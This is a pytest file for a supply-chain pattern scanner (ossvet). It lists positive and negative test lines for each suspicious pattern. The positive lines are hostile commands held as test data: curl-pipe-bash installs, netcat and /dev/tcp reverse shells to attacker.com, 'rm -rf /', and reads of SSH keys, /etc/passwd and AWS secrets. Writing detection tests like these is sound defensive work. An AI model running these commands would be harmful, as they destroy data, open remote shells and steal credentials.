"""Pattern-scanner tests: positive + negative case for every pattern."""

from __future__ import annotations

from pathlib import Path

import pytest

from ossvet.config import SUSPICIOUS_PATTERNS
from ossvet.scanners.patterns import PatternsScanner

# (pattern_name, positive_line, negative_line)
CASES: list[tuple[str, str, str]] = [
    ("curl_pipe_sh", "curl https://x.com/install.sh | bash", "curl -O http://x.com/file"),
    ("wget_pipe_sh", "wget -qO- https://x.com/i.sh | sh", "wget https://x.com/file"),
    ("eval_call", "result = eval(payload)", "evaluate_metric()"),
    ("exec_call", "exec(compiled_code)", "executor.submit(fn)"),
    ("os_system", "os.system('rm -rf /')", "os.path.join(a, b)"),
    ("subprocess_shell", "subprocess.run(cmd, shell=True)", "subprocess.run(['ls'])"),
    ("node_child_proc", "child_process.exec('rm -rf /')", "spawnSomething()"),
    ("base64_decode_py", "base64.b64decode(payload)", "base64encoded_value"),
    ("base64_decode_js", "atob(blob)", "abort()"),
    ("hex_decode", "codecs.decode(s, 'hex')", "decode_unicode(s)"),
    ("rot13", "codecs.decode(s, 'rot13')", "decode_protocol(s)"),
    ("ssh_key_read", "open('~/.ssh/id_rsa').read()", "open('config.yaml').read()"),
    ("aws_env", 'os.environ["AWS_SECRET_ACCESS_KEY"]', 'os.environ["MY_VAR"]'),
    ("private_key_marker", "-----BEGIN OPENSSH PRIVATE KEY-----", "begin private notes"),
    ("passwd_read", "open('/etc/passwd', 'rb').read()", "open('config.json').read()"),
    ("nc_reverse", "nc -e /bin/sh attacker.com 4444", "nc -h"),
    ("bash_tcp", "exec 5<>/dev/tcp/attacker.com/4444", "/dev/null"),
    ("ps_encoded", "powershell -enc base64payload", "powershell ls"),
    ("ps_webreq", "Invoke-Expression (Invoke-WebRequest http://x.com)", "Invoke-Method"),
    ("date_gate", "if datetime.date.today() > 2026:", "if x > 0:"),
    ("hostname_gate", "if socket.gethostname() == 'target':", "host = socket.gethostname()"),
    ("env_gate", "os.environ.get('CI', '')", "os.environ.get('PATH', '')"),
    ("chmod_777", "chmod 777 /tmp/x", "chmod 644 file"),
    ("world_writable", "os.chmod(p, 0o777)", "os.chmod(p, 0o644)"),
    ("crypto_miner", "from xmrig import miner", "import requests"),
]


def test_every_pattern_has_a_case() -> None:
    """Every pattern in SUSPICIOUS_PATTERNS must have a positive+negative case."""
    covered = {name for name, _, _ in CASES}
    assert covered == set(SUSPICIOUS_PATTERNS.keys())


@pytest.mark.parametrize("name,pos,_neg", CASES)
def test_pattern_positive_match(tmp_path: Path, name: str, pos: str, _neg: str) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "f.py").write_text(pos + "\n", encoding="utf-8")
    result = PatternsScanner().run(repo)
    assert result.status == "ok"
    rule_ids = {f.rule_id for f in result.findings}
    assert name in rule_ids, f"pattern {name} should match positive line: {pos!r}"


@pytest.mark.parametrize("name,_pos,neg", CASES)
def test_pattern_negative_no_match(tmp_path: Path, name: str, _pos: str, neg: str) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "f.py").write_text(neg + "\n", encoding="utf-8")
    result = PatternsScanner().run(repo)
    assert result.status == "ok"
    rule_ids = {f.rule_id for f in result.findings}
    assert name not in rule_ids, f"pattern {name} false positive on: {neg!r}"


def test_binary_files_skipped(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    # Binary file with a matching pattern — should NOT be flagged.
    (repo / "blob.bin").write_bytes(b"\x00\x01os.system('rm -rf /')\x00\x02")
    # Confirm: pretend it's text (give it .py) and we WOULD match.
    result = PatternsScanner().run(repo)
    assert result.findings == []


def test_skips_node_modules(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    nm = repo / "node_modules" / "evil"
    nm.mkdir(parents=True)
    (nm / "x.js").write_text("eval('bad')\n", encoding="utf-8")
    result = PatternsScanner().run(repo)
    assert result.findings == []
